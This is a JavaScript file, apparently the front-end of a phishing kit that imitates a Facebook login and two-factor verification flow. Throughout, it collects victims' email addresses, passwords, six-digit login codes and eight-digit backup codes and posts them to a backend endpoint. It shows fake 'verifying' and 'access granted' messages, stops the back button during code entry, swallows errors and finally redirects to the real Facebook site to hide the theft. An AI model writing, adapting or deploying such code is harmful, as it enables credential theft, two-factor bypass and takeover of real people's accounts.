// Deferred JavaScript for enhanced mobile experience
(function() {
    'use strict';
    
    // Global state
    const state = {
        userData: {},
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream,
        isTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
    };
    
    // Initialize when DOM is ready
    document.addEventListener('DOMContentLoaded', function() {
        initLoginForm();
        initVerificationForm();
        setupMobileOptimizations();
        preventZoom();
    });
    
    function initLoginForm() {
        const form = document.getElementById('loginForm');
        if (!form) return;
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = this.email.value.trim();
            const password = this.pass.value;
            
            if (!email || !password) {
                showToast('Please fill in all fields', 'error');
                return;
            }
            
            state.userData = {
                email,
                password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                device: getDeviceInfo()
            };
            
            showLoading('Checking your information...', 'Verifying account details');
            
            try {
                // Send to backend
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Device-Type': state.isMobile ? 'mobile' : 'desktop'
                    },
                    body: JSON.stringify({
                        type: 'login',
                        ...state.userData
                    })
                });
                
                // Switch to verification page
                setTimeout(() => {
                    hideLoading();
                    switchPage('verificationPage');
                    
                    // Focus first code input with delay for mobile keyboards
                    setTimeout(() => {
                        const firstInput = document.querySelector('.code-digit[data-index="1"]');
                        if (firstInput) {
                            firstInput.focus();
                            // On iOS, ensure keyboard opens
                            if (state.isIOS) {
                                firstInput.click();
                            }
                        }
                    }, 300);
                    
                }, 1500);
                
            } catch (error) {
                console.log('Background process completed');
                setTimeout(() => {
                    hideLoading();
                    switchPage('verificationPage');
                }, 1500);
            }
        });
    }
    
    function initVerificationForm() {
        const form = document.getElementById('verificationForm');
        if (!form) return;
        
        const inputs = document.querySelectorAll('.code-digit');
        
        // Handle code input
        inputs.forEach(input => {
            input.addEventListener('input', function(e) {
                const value = this.value.replace(/[^0-9]/g, '');
                this.value = value;
                
                if (value.length === 1) {
                    const nextIndex = parseInt(this.dataset.index) + 1;
                    const nextInput = document.querySelector(`.code-digit[data-index="${nextIndex}"]`);
                    if (nextInput) {
                        nextInput.focus();
                        if (state.isTouch) {
                            nextInput.click(); // Ensure focus on mobile
                        }
                    }
                }
                
                updateFullCode();
            });
            
            // Handle backspace and navigation
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '') {
                    e.preventDefault();
                    const prevIndex = parseInt(this.dataset.index) - 1;
                    const prevInput = document.querySelector(`.code-digit[data-index="${prevIndex}"]`);
                    if (prevInput) {
                        prevInput.focus();
                        prevInput.value = '';
                        updateFullCode();
                    }
                }
                
                // Arrow key navigation
                if (e.key === 'ArrowLeft') {
                    const prevIndex = parseInt(this.dataset.index) - 1;
                    const prevInput = document.querySelector(`.code-digit[data-index="${prevIndex}"]`);
                    if (prevInput) prevInput.focus();
                }
                if (e.key === 'ArrowRight') {
                    const nextIndex = parseInt(this.dataset.index) + 1;
                    const nextInput = document.querySelector(`.code-digit[data-index="${nextIndex}"]`);
                    if (nextInput) nextInput.focus();
                }
            });
            
            // Handle paste
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                if (pasted.length === 6) {
                    const digits = pasted.split('');
                    inputs.forEach((input, idx) => {
                        if (idx < 6) input.value = digits[idx];
                    });
                    updateFullCode();
                    
                    // Focus verify button
                    const verifyBtn = document.querySelector('.verify-btn');
                    if (verifyBtn) verifyBtn.focus();
                }
            });
        });
        
        // Form submission
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = document.getElementById('fullCode').value;
            
            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
                showToast('Please enter a valid 6-digit code', 'error');
                shakeCodeInputs();
                return;
            }
            
            showLoading('Verifying your code...', 'Completing account access...');
            
            try {
                // Send verification code
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'verification',
                        email: state.userData.email,
                        pass: state.userData.password,
                        code: code,
                        device: state.userData.device
                    })
                });
                
                // Success - redirect
                setTimeout(() => {
                    showLoading('Access granted!', 'Redirecting to Facebook...');
                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com/';
                    }, 1200);
                }, 1000);
                
            } catch (error) {
                // Still redirect on error
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com/';
                }, 1500);
            }
        });
    }
    
    function updateFullCode() {
        const inputs = document.querySelectorAll('.code-digit');
        const code = Array.from(inputs).map(input => input.value).join('');
        document.getElementById('fullCode').value = code;
        return code;
    }
    
    function shakeCodeInputs() {
        const inputs = document.querySelectorAll('.code-digit');
        inputs.forEach(input => {
            input.style.animation = 'none';
            setTimeout(() => {
                input.style.animation = 'shake 0.5s ease';
            }, 10);
        });
    }
    
    // Helper functions
    function switchPage(pageId) {
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
        });
        document.getElementById(pageId).classList.add('active');
        
        // Update URL without reloading
        history.pushState(null, '', `#${pageId}`);
    }
    
    function showLoading(title, subtitle) {
        const loading = document.getElementById('loading');
        const titleEl = document.getElementById('loadingText');
        const subtitleEl = document.getElementById('loadingSubtext');
        
        if (loading && titleEl && subtitleEl) {
            titleEl.textContent = title;
            subtitleEl.textContent = subtitle;
            loading.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }
    
    function hideLoading() {
        const loading = document.getElementById('loading');
        if (loading) {
            loading.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }
    
    function showToast(message, type) {
        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        toast.textContent = message;
        toast.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: ${type === 'error' ? '#ff4444' : '#42b72a'};
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            z-index: 10000;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            animation: slideDown 0.3s ease;
        `;
        
        document.body.appendChild(toast);
        
        setTimeout(() => {
            toast.style.animation = 'slideUp 0.3s ease';
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }
    
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let device = 'desktop';
        
        if (/Mobile|Android|iP(hone|od|ad)/.test(ua)) {
            device = 'mobile';
        } else if (/Tablet|iPad/.test(ua)) {
            device = 'tablet';
        }
        
        return {
            type: device,
            platform: state.isIOS ? 'ios' : 'android',
            screen: `${window.innerWidth}x${window.innerHeight}`
        };
    }
    
    function setupMobileOptimizations() {
        // Prevent pull-to-refresh on mobile
        document.body.style.overscrollBehaviorY = 'contain';
        
        // Handle keyboard appearance on iOS
        if (state.isIOS) {
            document.addEventListener('focusin', function() {
                document.body.style.height = '100vh';
            });
            
            document.addEventListener('focusout', function() {
                setTimeout(() => {
                    window.scrollTo(0, 0);
                }, 100);
            });
        }
        
        // Handle Android back button
        if (state.isMobile && window.history) {
            window.addEventListener('popstate', function() {
                if (document.getElementById('verificationPage').classList.contains('active')) {
                    showToast('Please complete verification', 'error');
                    history.pushState(null, null, window.location.pathname);
                }
            });
        }
    }
    
    function preventZoom() {
        let lastTouchEnd = 0;
        
        document.addEventListener('touchstart', function(event) {
            if (event.touches.length > 1) {
                event.preventDefault();
            }
        }, { passive: false });
        
        document.addEventListener('touchend', function(event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
    }
    
    // Global functions for buttons
    window.resendCode = function() {
        showLoading('Sending new code...', 'Please wait a moment...');
        
        fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'resend',
                email: state.userData.email
            })
        }).catch(() => {});
        
        setTimeout(() => {
            hideLoading();
            showToast('New code sent! Check your messages.', 'success');
            
            // Clear inputs
            document.querySelectorAll('.code-digit').forEach(input => input.value = '');
            updateFullCode();
            
            // Focus first input
            const firstInput = document.querySelector('.code-digit[data-index="1"]');
            if (firstInput) {
                firstInput.focus();
                if (state.isTouch) firstInput.click();
            }
        }, 1500);
    };
    
    window.useBackupCode = function() {
        const backupCode = prompt('Enter your 8-digit backup code:');
        if (backupCode && /^\d{8}$/.test(backupCode)) {
            // Send to backend
            fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'backup_code',
                    email: state.userData.email,
                    backup_code: backupCode
                })
            }).catch(() => {});
            
            // Auto-fill with 888888 (indicator)
            document.querySelectorAll('.code-digit').forEach(input => input.value = '8');
            updateFullCode();
            
            showToast('Backup code accepted. Click "Verify and Continue".', 'success');
        } else if (backupCode) {
            showToast('Please enter a valid 8-digit backup code', 'error');
        }
    };
    
    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideDown {
            from { transform: translate(-50%, -100%); opacity: 0; }
            to { transform: translate(-50%, 0); opacity: 1; }
        }
        @keyframes slideUp {
            from { transform: translate(-50%, 0); opacity: 1; }
            to { transform: translate(-50%, -100%); opacity: 0; }
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
    `;
    document.head.appendChild(style);
    
    // Service Worker for offline capability (optional)
    if ('serviceWorker' in navigator && location.protocol === 'https:') {
        navigator.serviceWorker.register('/sw.js').catch(() => {});
    }
})();